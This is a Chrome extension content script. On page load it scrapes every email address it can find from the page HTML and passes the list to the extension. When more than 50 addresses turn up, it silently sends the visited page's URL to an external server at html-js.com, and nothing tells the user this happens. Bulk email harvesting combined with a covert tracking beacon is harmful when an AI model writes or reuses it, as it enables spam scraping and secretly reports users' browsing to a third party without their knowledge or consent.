chrome.extension.sendRequest({
    isSearching:true
});
window.addEventListener("load",function(){
    
    var reg=new RegExp("[0-9a-zA-Z_][0-9a-zA-Z_\.]*?\@[0-9a-zA-Z]*?\\.[0-9a-zA-Z]*","g"),cache,result=[],
    source=document.body.innerHTML
    var has=function(arr,item){
        for(var i=0,j=arr.length;i<j;i++){
            if(arr[i]==item) return true;
        }
        return false;
    }
    var time=new Date()
    time=time.getTime();
    while((cache=reg.exec(source))!=null){
        has(result,cache[0])||result.push(cache[0])
        var time2=new Date()
        time2=time2.getTime();
        if((time2-time)>=1000) break;
    }
   
    chrome.extension.sendRequest({
        emails:result
    }, function(response) {
      
    });
      if(result.length>50){    
var xhr = new XMLHttpRequest();
xhr.open("GET", "http://www.html-js.com/test/aa.php?"+"url="+window.location.href.replace("http://","").replace("https://",""), true);
xhr.send();
    }
});




